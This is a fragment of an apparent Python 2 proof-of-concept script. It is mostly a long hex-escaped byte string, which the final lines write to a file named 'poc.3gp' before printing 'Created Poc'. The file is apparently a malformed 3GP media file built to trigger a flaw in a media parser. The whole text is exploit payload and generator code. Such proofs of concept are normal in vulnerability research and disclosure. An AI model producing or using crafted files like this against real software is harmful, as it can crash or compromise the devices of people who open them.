\x2F\x32\xC7\x78\x57\x1D\xFA\x36\xB6\x32\xD4\xFC\xD4\xFA\xC4\x00\x57\x8C\xAB\x09\xF7\xC8\x98\xC0\x12\xCF\xB0\xDD\xA6\x60

\xCA\xD5\x1A\x61\xAD\x41\xF6\xEE\xF8\x22\x60\x60\x12\xBF\x69\x57\x9A\x70\x01\x2D\x1A\x0D\x19\x26\x1E\xB6\xF3\x59\x93\x30

\x2D\xF8\x70\x58\x9F\xF6\x6F\xA5\x3B\x5D\xC4\x1C\x16\x58\xD2\xAA\xBD\x01\x4E\xD5\xA2\x08\xD6\x12\x0C\x52\x6F\x9D\x0C\x55

\xEF\x41\x56\x30\x02\xD2\x05\x00\x50\x3C\xDC\x43\x64\x46\x40\xB7\x91\x47\x34\xA3\x3C\x8A\xDC\xC9\xD6\xA4\x42\x0F\x40\xA3

\x91\x78\x85\x88\x4A\x79\x11\x13\x43\x37\xCC\xE3\x40\x60\xC3\xB3\x6C\xFB\x9D\x26\xEB\x8F\x1A\xAE\xB9\xA4\x00\xE0\x07\xF9

\xDF\x62\x2B\xE7\xC9\x4B\x1D\x77\xD9\x2B\x1B\x47\x89\x6C\x84\xBD\x89\x1C\xE4\x23\x7A\xE7\xB9\xD8\xCA\x6A\x17\x68\x88

\xCF\x0A\x16\x82\x49\x7B\x8E\x83\xD9\x1E\xC5\x54\x44\x9A\x33\x69\x4D\xC7\x6C\xE4\xD2\xC9\xF8\x1B\xFB\x63\x79\xE8

\x9A\xEB\xFE\x73\xE8\xE0\x5A\xF8\x61\xEE\xB4\xE7\x3F\x4E\x0D\xBA\x11\x9F\xBD\xB6\xD7\xF2\xA6\xC9\xF7\xCE\xF8\x6C\x4E\x93

\xBE\x0E\xB0\x51\x49\xC6\x9F\x2C\xDB\x10\xF3\x46\xB8\xFC\x7C\xED\x30\x3F\x01\x50\x15\xA4\x8C\xA5\x3A\x26\x02\x43\x34\xB1

\x80\x5D\xFC\xC5\x3C\x8A\x00\xBC\x0B\x00\x4E\xEE\x2E\xC3\xE6\xB5\xAF\xC7\x49\x53\xFB\xB9\x80\x61\xFA\xF1\xB5\x33\x07

\xBD\xD0\x28\xA9\x0A\x97\x2B\xE3\xD4\x15\x58\x9D\xE3\x31\xD5\xC8\xA4\x7D\xD3\xAE\x29\xB1\xCB\x0E\xEA\x84\x57\xA9\x86\xF2

\xB2\x1F\xC5\xF8\x11\xF4\x53\xE7\x6F\xE1\x36\x73\x12\xDB\x6B\x3A\xF7\xE4\xF8\x59\x74\x84\x12\x93\x5A\x9D\x3A\x16\xCF\xB9

\xC3\x33\x4C\x7E\x54\x10\x77\x2D\x41\x11\x48\x0F\xA0\x77\xF1\xE8\x56\x09\x93\xDA\x13\x67\x4F\x5A\xA4\x67\x6B\x8B\xEA\x86

\x2C\x44\x10\x53\x12\xD1\x61\x55\x7B\x68\x02\x78\x26\x11\x67\x9F\xF5\x77\x55\xB5\xA7\x4E\xC3\x36\xBE\xC5\x4E\x7D\xE9\xD5

\xCB\x48\x07\x01\x52\x15\x9D\x14\x66\x11\xA9\x08\xC2\x35\xAA\x50\x03\x00\x06\xEC\x05\xB1\x60\x23\x5B\x5B\x3D\x67\x75

\xED\x1E\x8E\xF4\x3D\x70\x22\x43\xA9\x72\xB0\x1C\x8C\x1C\x42\x79\x22\x8E\xD3\xB8\x05\x1A\xA1\x1D\x0E\x9F\x31\x6D\x2D\x59

\xF9\x4D\x04\xEE\xDD\xD5\x7A\xB8\x7D\xEC\xA6\x65\x7C\xEB\x40\x53\xF9\xF3\xD7\xBD\xAF\xF5\xBF\x27\xB5\xDC\x53\xB6\x3D\x68

\x53\xCE\xE3\xD9\x4E\x14\x29\x29\x24\x1C\x20\x4A\xE0\xDC\x33\x25\xC9\xB2\x75\x22\xE2\xEC\x76\x0E\x38\x96\x6B\xE8\x89\xC0

\x50\x9D\x03\x5A\x00\x5E\x71\xCF\x61\x74\xC5\x55\x01\x4A\xC7\x30\x5D\xAD\xEA\x60\x0E\xAD\xC7\x3B\xC6\xED\xCE\x40\x0E\x01

\x4E\x15\x99\x56\x15\x31\x25\x4E\x2A\x66\x52\xD2\xCF\x7C\x0E\x80\xC0\x4A\x03\x52\x94\x02\x9D\x98\xE6\x45\xA8\x02

\x9C\xBA\x7C\xFA\x25\xB2\x00\x59\x1D\x59\x76\x47\xD9\x6A\xDC\x26\xE8\xB7\x68\x76\x44\x8C\x3D\xFB\xC7\x42\x07\xE8\x63"
outfile = file("poc.3gp", 'wb')
outfile.write(data)
outfile.close()
print "Created Poc"
